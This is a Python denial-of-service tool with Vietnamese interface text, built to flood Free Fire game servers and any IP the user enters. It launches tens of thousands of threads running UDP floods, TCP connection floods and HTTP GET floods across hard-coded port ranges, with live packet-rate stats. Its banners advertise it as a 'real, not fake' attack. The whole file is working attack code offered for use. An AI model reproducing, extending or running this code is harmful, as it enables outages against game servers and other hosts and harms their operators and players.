# ============================================
# FF BYPASS DDoS - KHÔNG FAKE - DDoS THẬT
# GỬI GÓI TIN THẬT - TỐC ĐỘ CAO - HIỆU QUẢ
# ============================================

import socket
import time
import threading
import os
import random
from datetime import datetime

# ============================================
# PORT GAME - QUÉT NHANH PORT CHÍNH
# ============================================
FF_PORTS = []
for start, end in [
    (10000, 10100), (17000, 17100), (17500, 17600),
    (18000, 18100), (19000, 19100), (19500, 19600),
    (20000, 20100), (21000, 21100), (21500, 21600),
    (22000, 22100), (23000, 23100), (25000, 25100),
    (27000, 27100), (28000, 28100), (30000, 30100),
    (35000, 35100), (40000, 40100), (45000, 45100),
    (50000, 50100), (55000, 55100), (60000, 60100),
]:
    FF_PORTS.extend(range(start, end))

# ============================================
# CẤU HÌNH TỐI ĐA
# ============================================
MAX_THREADS = 50000
SOCKET_POOL_SIZE = 500
BATCH_SIZE = 1000
BURST_MULTIPLIER = 100  # Gửi 100 gói/lần
PAYLOAD_SIZE = 2048

class RealDDoSEngine:
    def __init__(self):
        self.targets = []
        self.running = False
        self.packets = 0
        self.errors = 0
        self.connections = 0
        self.lock = threading.Lock()
        self.udp_pool = []
        self.pool_lock = threading.Lock()
    
    def inc(self, n=1):
        with self.lock: self.packets += n
    def inc_conn(self):
        with self.lock: self.connections += 1
    def err(self):
        with self.lock: self.errors += 1
    def get(self):
        with self.lock: return self.packets, self.errors, self.connections

    def _init_pool(self):
        """Tạo socket pool"""
        for _ in range(SOCKET_POOL_SIZE):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65535)
                s.settimeout(0.05)
                self.udp_pool.append(s)
            except:
                pass

    def _get_socket(self):
        with self.pool_lock:
            if self.udp_pool:
                s = self.udp_pool.pop(0)
                self.udp_pool.append(s)
                return s
        return None

    def _udp_worker(self, worker_id):
        """UDP Flood - GỬI GÓI THẬT - KHÔNG FAKE"""
        data = os.urandom(PAYLOAD_SIZE)
        count = 0
        max_packets = 100000
        
        while self.running and count < max_packets:
            s = self._get_socket()
            if s is None:
                time.sleep(0.00001)
                continue
            
            try:
                ip = random.choice(self.targets)
                port = random.choice(FF_PORTS)
                
                # Gửi burst 100 gói
                for _ in range(BURST_MULTIPLIER):
                    s.sendto(data, (ip, port))
                    self.inc()
                    count += 1
                
                # Đổi payload mỗi 10000 gói
                if count % 10000 == 0:
                    data = os.urandom(random.randint(512, 4096))
                    
            except:
                self.err()

    def _tcp_worker(self, worker_id):
        """TCP SYN Flood - THẬT - KHÔNG FAKE"""
        count = 0
        max_conn = 50000
        
        while self.running and count < max_conn:
            s = None
            try:
                ip = random.choice(self.targets)
                port = random.choice(FF_PORTS)
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(0.05)
                s.connect_ex((ip, port))
                s.send(os.urandom(512))
                self.inc()
                self.inc_conn()
                count += 1
                
            except:
                self.err()
            finally:
                if s:
                    try: s.close()
                    except: pass

    def _http_worker(self, worker_id):
        """HTTP Flood - THẬT - KHÔNG FAKE IP"""
        count = 0
        max_req = 30000
        
        while self.running and count < max_req:
            s = None
            try:
                ip = random.choice(self.targets)
                port = random.choice([80, 443, 8080, 8443])
                
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.settimeout(0.1)
                s.connect_ex((ip, port))
                
                # HTTP request đơn giản - KHÔNG FAKE
                req = (
                    f"GET / HTTP/1.1\r\n"
                    f"Host: {ip}\r\n"
                    f"User-Agent: FreeFire/1.107.1\r\n"
                    f"Connection: keep-alive\r\n"
                    f"\r\n"
                )
                s.send(req.encode())
                self.inc()
                self.inc_conn()
                count += 1
                
            except:
                self.err()
            finally:
                if s:
                    try: s.close()
                    except: pass

    def _batch_launcher(self, total_threads, worker_func):
        """Phóng thread hàng loạt"""
        created = 0
        
        while self.running and created < total_threads:
            batch = min(BATCH_SIZE, total_threads - created)
            
            for i in range(batch):
                t = threading.Thread(
                    target=worker_func,
                    args=(created + i,),
                    daemon=True
                )
                t.start()
                created += 1
            
            if created < total_threads:
                time.sleep(0.1)
                print(f"\r  [⏳] {created}/{total_threads} threads...", end='')

    def start(self, targets, threads, udp_pct, tcp_pct, http_pct):
        if self.running:
            self.stop()
            time.sleep(0.3)
        
        if not targets:
            return 0, 0, 0, 0
        
        self.targets = targets
        self.running = True
        self.packets = 0
        self.errors = 0
        self.connections = 0
        
        self._init_pool()
        
        threads = min(threads, MAX_THREADS)
        
        udp_n = int(threads * udp_pct / 100)
        tcp_n = int(threads * tcp_pct / 100)
        http_n = int(threads * http_pct / 100)
        
        if udp_n > 0:
            threading.Thread(
                target=self._batch_launcher,
                args=(udp_n, self._udp_worker),
                daemon=True
            ).start()
        
        if tcp_n > 0:
            threading.Thread(
                target=self._batch_launcher,
                args=(tcp_n, self._tcp_worker),
                daemon=True
            ).start()
        
        if http_n > 0:
            threading.Thread(
                target=self._batch_launcher,
                args=(http_n, self._http_worker),
                daemon=True
            ).start()
        
        return udp_n + tcp_n + http_n, udp_n, tcp_n, http_n

    def stop(self):
        self.running = False
        for s in self.udp_pool:
            try: s.close()
            except: pass
        self.udp_pool.clear()


def print_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    print(f"""
    ╔══════════════════════════════════════════════╗
    ║  ☠ FF DDoS - REAL MODE - NO FAKE ☠       ║
    ║  GÓI TIN THẬT - HIỆU QUẢ CAO              ║
    ║  {MAX_THREADS} THREADS | {SOCKET_POOL_SIZE} SOCKETS | BURST {BURST_MULTIPLIER}x  ║
    ╚══════════════════════════════════════════════╝
    """)

def main():
    print_banner()
    
    print("  [+] NHẬP IP MỤC TIÊU:")
    ip_input = input("\n  >> ").strip()
    if not ip_input:
        print("  [-] CHƯA NHẬP IP!"); input(); return
    
    targets = [t.strip() for t in ip_input.replace(',', ' ').split() if t.strip()]
    if not targets:
        print("  [-] KHÔNG CÓ IP!"); input(); return
    
    print(f"\n  [+] SỐ THREADS (tối đa {MAX_THREADS}):")
    print(f"      Khuyên: 1000-5000 (mạnh, ổn định)")
    print(f"      5000-10000 (rất mạnh)")
    print(f"      10000+ (siêu mạnh - cần server khỏe)")
    try:
        threads = int(input("  >> ").strip() or "5000")
        threads = max(100, min(threads, MAX_THREADS))
    except:
        threads = 5000
    
    print(f"\n  [+] CHẾ ĐỘ:")
    print(f"      1. UDP MAX (90% UDP + 5% TCP + 5% HTTP)")
    print(f"      2. CÂN BẰNG (60% UDP + 25% TCP + 15% HTTP)")
    print(f"      3. TCP FOCUS (20% UDP + 70% TCP + 10% HTTP)")
    print(f"      4. TỰ CHỈNH")
    mode = input("  >> ").strip() or "1"
    
    if mode == "1": udp_pct, tcp_pct, http_pct = 90, 5, 5
    elif mode == "2": udp_pct, tcp_pct, http_pct = 60, 25, 15
    elif mode == "3": udp_pct, tcp_pct, http_pct = 20, 70, 10
    elif mode == "4":
        try:
            udp_pct = int(input("  UDP %: ").strip() or "60")
            tcp_pct = int(input("  TCP %: ").strip() or "25")
            http_pct = int(input("  HTTP %: ").strip() or "15")
            if udp_pct + tcp_pct + http_pct != 100:
                udp_pct, tcp_pct, http_pct = 90, 5, 5
        except:
            udp_pct, tcp_pct, http_pct = 90, 5, 5
    else:
        udp_pct, tcp_pct, http_pct = 90, 5, 5
    
    print(f"\n  [☠] KHỞI ĐỘNG {threads} THREADS...")
    print(f"  [📊] UDP: {udp_pct}% | TCP: {tcp_pct}% | HTTP: {http_pct}%")
    print(f"  [⚠] KHÔNG FAKE - GÓI TIN THẬT - HIỆU QUẢ CAO")
    
    engine = RealDDoSEngine()
    total, udp_n, tcp_n, http_n = engine.start(targets, threads, udp_pct, tcp_pct, http_pct)
    
    if not total:
        print("  [-] LỖI!"); input(); return
    
    start_time = time.time()
    print(f"\n  [✅] {total} THREADS ĐANG CHẠY!")
    print(f"  [UDP] {udp_n} | [TCP] {tcp_n} | [HTTP] {http_n}")
    print(f"  [🎯] {len(targets)} IP")
    print(f"  [💣] BURST {BURST_MULTIPLIER}x | PAYLOAD {PAYLOAD_SIZE}B")
    print(f"\n  ╔══════════════════════════════════╗")
    print(f"  ║  ENTER = DỪNG                  ║")
    print(f"  ╚══════════════════════════════════╝")
    
    monitor_run = True
    def monitor():
        while monitor_run and engine.running:
            p, e, c = engine.get()
            el = time.time() - start_time
            pps = p / el if el > 0 else 0
            m, s = divmod(int(el), 60)
            print(f"\r  [📊] GÓI: {p:,} | {pps:,.0f}/s | CONN: {c:,} | LỖI: {e} | {m:02d}:{s:02d}  ", end='')
            time.sleep(0.2)
    
    threading.Thread(target=monitor, daemon=True).start()
    input()
    
    engine.stop()
    monitor_run = False
    time.sleep(0.5)
    
    p, e, c = engine.get()
    el = time.time() - start_time
    pps = p / el if el > 0 else 0
    m, s = divmod(int(el), 60)
    
    print(f"""\n
    ╔══════════════════════════════════════════════╗
    ║           KẾT THÚC                           ║
    ╠══════════════════════════════════════════════╣
    ║  TIME:     {m:>2}p {s:>2}s                          ║
    ║  GÓI:      {p:>12,}                        ║
    ║  TỐC ĐỘ:   {pps:>12,.0f}/s                    ║
    ║  KẾT NỐI:  {c:>12,}                        ║
    ║  LỖI:      {e:>12,}                        ║
    ║  THREADS:  {total:>12,}                        ║
    ╚══════════════════════════════════════════════╝
    """)
    input()

if __name__ == '__main__':
    main()
